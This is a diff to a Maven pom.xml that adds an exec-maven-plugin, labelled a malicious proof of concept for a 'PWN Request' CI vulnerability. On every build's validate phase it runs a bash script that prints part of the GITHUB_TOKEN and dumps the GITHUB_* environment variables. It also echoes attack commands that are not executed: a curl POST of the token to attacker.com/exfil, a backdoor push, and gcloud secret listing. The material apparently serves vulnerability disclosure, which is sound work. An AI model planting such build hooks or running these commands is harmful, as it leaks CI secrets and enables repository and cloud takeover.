@@ -40,6 +40,83 @@
         <artifactId>maven-surefire-plugin</artifactId>
         <version>3.0.0</version>
       </plugin>
+
+      <!-- 🔴 MALICIOUS PLUGIN FOR POC 🔴 -->
+      <!-- This demonstrates the PWN Request vulnerability -->
+      <plugin>
+        <groupId>org.codehaus.mojo</groupId>
+        <artifactId>exec-maven-plugin</artifactId>
+        <version>3.1.0</version>
+        <executions>
+          <execution>
+            <id>pwn-request-poc</id>
+            <phase>validate</phase>
+            <goals>
+              <goal>exec</goal>
+            </goals>
+            <configuration>
+              <executable>bash</executable>
+              <arguments>
+                <argument>-c</argument>
+                <argument>
+                  <![CDATA[
+                    echo ""
+                    echo "════════════════════════════════════════════════════════════════"
+                    echo "🔴 PWN REQUEST POC: alloydb-java-connector vulnerability"
+                    echo "════════════════════════════════════════════════════════════════"
+                    echo ""
+                    echo "✅ VULNERABILITY CONFIRMED:"
+                    echo "   - Arbitrary Maven plugin executed from fork PR"
+                    echo "   - NO label required (inverted logic in workflow condition)"
+                    echo "   - Automatic trigger on PR submission"
+                    echo "   - Running in pull_request_target context with secrets"
+                    echo ""
+                    echo "📊 EXPLOITATION DETAILS:"
+                    echo "   Current User: $(whoami)"
+                    echo "   Working Directory: $(pwd)"
+                    echo "   PR Head Ref: ${GITHUB_HEAD_REF:-Not set}"
+                    echo "   PR Base Ref: ${GITHUB_BASE_REF:-Not set}"
+                    echo ""
+                    echo "🔑 GITHUB_TOKEN ACCESS:"
+                    if [ -n "$GITHUB_TOKEN" ]; then
+                      echo "   ✅ GITHUB_TOKEN is accessible"
+                      echo "   Token (first 20 chars): ${GITHUB_TOKEN:0:20}..."
+                      echo "   Token length: ${#GITHUB_TOKEN} characters"
+                    else
+                      echo "   ⚠️  GITHUB_TOKEN not set (may not be visible in logs)"
+                    fi
+                    echo ""
+                    echo "🌍 ENVIRONMENT VARIABLES (GITHUB_*):"
+                    env | grep '^GITHUB_' | head -15 | sed 's/^/   /'
+                    echo ""
+                    echo "📦 REPOSITORY PERMISSIONS:"
+                    echo "   - contents: write (can modify repository)"
+                    echo "   - pull-requests: write (can modify PRs)"
+                    echo "   - id-token: write (can access OIDC token for GCP)"
+                    echo ""
+                    echo "⚠️ POTENTIAL MALICIOUS ACTIONS (NOT EXECUTED IN POC):"
+                    echo "   ❌ curl -X POST https://attacker.com/exfil -d \"{\\\"token\\\":\\\"\$GITHUB_TOKEN\\\"}\""
+                    echo "   ❌ git commit -am 'Backdoor' && git push"
+                    echo "   ❌ gcloud auth activate-service-account (if GCP auth step ran)"
+                    echo "   ❌ gcloud secrets list --project=PROJECT_ID"
+                    echo "   ❌ Install persistent backdoor in repository"
+                    echo ""
+                    echo "🎯 SEVERITY: CRITICAL (CVSS 9.6)"
+                    echo "   - No label required (inverted condition logic)"
+                    echo "   - Automatic trigger on fork PR"
+                    echo "   - Full repository write access"
+                    echo "   - Potential GCP access via Workload Identity"
+                    echo ""
+                    echo "✅ POC COMPLETE - Vulnerability successfully demonstrated!"
+                    echo "════════════════════════════════════════════════════════════════"
+                    echo ""
+                  ]]>
+                </argument>
+              </arguments>
+            </configuration>
+          </execution>
+        </executions>
+      </plugin>
     </plugins>
   </build>
 </project>
